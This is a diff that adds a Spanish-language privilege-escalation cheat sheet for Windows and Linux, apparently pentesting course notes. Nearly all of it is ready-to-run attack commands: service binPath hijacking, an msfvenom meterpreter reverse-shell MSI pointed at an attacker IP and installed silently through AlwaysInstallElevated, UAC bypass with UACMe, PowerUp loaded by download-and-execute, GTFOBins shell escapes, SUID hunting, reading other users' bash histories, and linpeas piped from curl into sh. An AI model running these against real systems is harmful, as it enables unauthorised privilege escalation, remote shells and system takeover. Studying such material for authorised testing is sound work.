@@ -1,0 +1,123 @@
+===========================================================
+  T2 - 5. ELEVACION DE PRIVILEGIOS
+===========================================================
+
+===========================================================
+  WINDOWS - TECNICAS PRINCIPALES
+===========================================================
+
+--- UNQUOTED SERVICE PATH ---
+# Localizar servicios con ruta sin comillas y espacios
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# Comprobar permisos sobre directorios padre
+icacls "C:\Program Files\Vendor"
+
+--- PERMISOS INSEGUROS EN SERVICIOS ---
+# Listar servicios
+sc query
+sc qc [NOMBRE-SERVICIO]
+
+# Permisos sobre el binario y sobre el servicio
+icacls "[RUTA-BINARIO]"
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "[USER]" *
+
+# Modificar binPath
+sc config [SERVICIO] binPath= "[COMANDO]"
+sc stop [SERVICIO] && sc start [SERVICIO]
+
+--- DLL HIJACKING - ORDEN DE BUSQUEDA ---
+1. Directorio de la aplicacion
+2. C:\Windows\System32
+3. C:\Windows\System
+4. C:\Windows
+5. CWD (directorio actual)
+6. PATH del sistema
+7. PATH del usuario
+
+--- ALWAYS INSTALL ELEVATED ---
+# Comprobar (ambas claves a 1)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Generar payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP-ATACANTE] lport=[PUERTO] -f msi > payload.msi
+
+# Ejecutar (silencioso)
+msiexec /quiet /qn /i payload.msi
+
+--- UAC BYPASS ---
+# Proyecto UACMe (multitud de metodos firmados)
+# https://github.com/hfiref0x/UACME
+Akagi64.exe [NUM-METODO] [COMANDO]
+
+===========================================================
+  WINDOWS - SCRIPTS AUTOMATICOS
+===========================================================
+
+--- POWERUP (PowerShell) ---
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
+Invoke-AllChecks
+
+--- SHARPUP (C#) ---
+SharpUp.exe audit
+
+--- WINPEAS ---
+.\winPEASx64.exe
+
+===========================================================
+  LINUX - TECNICAS PRINCIPALES
+===========================================================
+
+--- ENUMERACION USUARIO/SUDO ---
+sudo -l
+id
+groups
+
+--- KERNEL EXPLOITS ---
+uname -a
+cat /etc/*-release
+# Comparar contra: https://github.com/SecWiki/linux-kernel-exploits
+
+--- BINARIOS SUID ---
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+--- CAPABILITIES INSEGUROS ---
+/usr/bin/getcap -r /usr/bin 2>/dev/null
+# Buscar: cap_dac_read_search, cap_setuid+ep
+
+--- GTFOBINS (alternativas a comandos) ---
+# https://gtfobins.github.io/
+
+# Ejemplos rapidos:
+gdb -nx -ex '!sh' -ex quit
+mysql -e '! /bin/sh'
+awk 'BEGIN {system("/bin/sh")}'
+find . -exec /bin/sh \; -quit
+vim -c ':!/bin/sh'
+less archivo  # luego: !/bin/sh
+
+--- TAREAS PROGRAMADAS ---
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+--- ARCHIVOS ESCRIBIBLES POR TODOS ---
+find / -writable -type f 2>/dev/null | grep -v /proc
+
+--- CONTRASENAS EN HISTORICO ---
+cat ~/.bash_history
+cat /home/*/.bash_history 2>/dev/null
+
+===========================================================
+  LINUX - SCRIPTS AUTOMATICOS
+===========================================================
+# LinPEAS
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Otros
+LinEnum.sh
+linuxprivchecker.py
+unix-privesc-check standard
